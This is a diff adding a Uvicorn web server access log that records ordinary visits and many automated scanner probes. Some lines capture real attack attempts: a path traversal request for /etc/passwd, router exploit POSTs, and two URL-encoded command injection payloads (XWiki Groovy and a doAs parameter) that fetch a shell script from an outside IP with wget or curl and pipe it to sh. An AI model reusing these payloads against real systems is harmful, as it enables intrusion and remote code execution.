@@ -1,0 +1,114 @@
+INFO:     Started server process [631477]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+INFO:     90.193.234.127:55246 - "GET / HTTP/1.1" 200 OK
+INFO:     90.193.234.127:55246 - "GET / HTTP/1.1" 200 OK
+INFO:     90.193.234.127:55270 - "GET / HTTP/1.1" 200 OK
+INFO:     90.193.234.127:55256 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41610 - "GET / HTTP/1.1" 200 OK
+INFO:     90.193.234.127:32936 - "GET / HTTP/1.1" 200 OK
+INFO:     90.193.234.127:32936 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42582 - "GET / HTTP/1.1" 200 OK
+INFO:     90.193.234.127:60380 - "GET / HTTP/1.1" 200 OK
+INFO:     213.136.85.116:58114 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     90.193.234.127:56970 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.18:64874 - "GET / HTTP/1.1" 200 OK
+INFO:     5.61.209.92:60948 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+INFO:     18.212.88.233:34282 - "GET / HTTP/1.1" 200 OK
+INFO:     193.142.146.230:33956 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     45.135.194.98:54704 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     85.217.140.5:34448 - "GET / HTTP/1.1" 200 OK
+INFO:     204.76.203.6:44822 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+INFO:     45.135.194.98:50154 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     193.142.146.230:43198 - "GET /is_test HTTP/1.1" 404 Not Found
+INFO:     193.142.146.230:43202 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     213.136.85.116:54656 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     204.76.203.215:65318 - "GET /../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.129.110:23344 - "GET /v1/vector/collections/describe HTTP/1.1" 404 Not Found
+INFO:     152.32.129.110:23424 - "GET /v1 HTTP/1.1" 404 Not Found
+INFO:     152.32.129.110:23526 - "GET / HTTP/1.1" 200 OK
+INFO:     3.143.33.63:59644 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.129.110:23882 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.129.110:23962 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.156.129.52:47615 - "GET / HTTP/1.1" 200 OK
+INFO:     45.135.194.98:40734 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     45.135.194.98:49900 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     65.49.1.94:48964 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.1.99:33907 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     65.49.1.102:22229 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     65.49.1.96:29323 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     65.49.1.94:23520 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     212.102.57.167:51524 - "CONNECT www.uni-konstanz.de%3A443 HTTP/1.1" 404 Not Found
+INFO:     5.183.209.196:60576 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.207:56207 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     130.12.180.122:58794 - "POST /cgi-bin/luci/%3Bstok%3D/locale?form=country HTTP/1.1" 404 Not Found
+INFO:     130.12.180.122:58798 - "POST /cgi-bin/luci/%3Bstok%3D/locale?form=country HTTP/1.1" 404 Not Found
+INFO:     89.42.231.200:48076 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+INFO:     192.159.99.95:42412 - "POST /tmUnblock.cgi HTTP/1.1" 404 Not Found
+INFO:     192.159.99.95:48296 - "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%5B%27sh%27%2C%20%27-c%27%2C%20%27%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.sdu.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.sdu.sh%7C%7Ccurl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.sdu.sh%29%7Csh%27%5D.execute%28%29.text%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1" 404 Not Found
+INFO:     192.159.99.95:36548 - "GET /?doAs=%60%28wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.pms.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.pms.sh%7C%7Ccurl%20-s%20http%3A%2F%2F41.231.37.153%2Frondo.pms.sh%29%7Csh%60 HTTP/1.1" 200 OK
+INFO:     45.135.194.98:44158 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     159.89.54.150:60310 - "GET / HTTP/1.1" 200 OK
+INFO:     159.89.54.150:60316 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     204.76.203.18:52436 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     204.76.203.18:41778 - "GET /bins/ HTTP/1.1" 404 Not Found
+INFO:     204.76.203.18:49114 - "GET /bin/ HTTP/1.1" 404 Not Found
+INFO:     204.76.203.18:41078 - "GET /backup/ HTTP/1.1" 404 Not Found
+INFO:     193.142.146.230:54016 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     5.61.209.92:45902 - "GET /SDK/webLanguage HTTP/1.1" 404 Not Found
+INFO:     167.94.146.61:54576 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.61:63152 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.61:63164 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.61:63178 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.61:32688 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     204.76.203.30:37284 - "GET http%3A//ip-api.com/json/ HTTP/1.1" 404 Not Found
+INFO:     45.135.194.98:34104 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.243.196.43:60442 - "GET / HTTP/1.1" 200 OK
+INFO:     162.243.196.43:60456 - "GET /download/powershell/ HTTP/1.1" 404 Not Found
+INFO:     162.243.196.43:60470 - "GET /get.php HTTP/1.1" 404 Not Found
+INFO:     95.214.55.246:45124 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     95.214.55.246:45134 - "POST /_next HTTP/1.1" 404 Not Found
+INFO:     95.214.55.246:45146 - "POST /api HTTP/1.1" 404 Not Found
+INFO:     95.214.55.246:45158 - "POST /_next/server HTTP/1.1" 404 Not Found
+INFO:     95.214.55.246:45162 - "POST /app HTTP/1.1" 404 Not Found
+INFO:     95.214.55.246:45164 - "POST /api/route HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.139:49886 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.139:49896 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.139:49908 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.139:50002 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     45.135.194.98:52912 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     204.76.203.30:33444 - "GET http%3A//ip-api.com/json/ HTTP/1.1" 404 Not Found
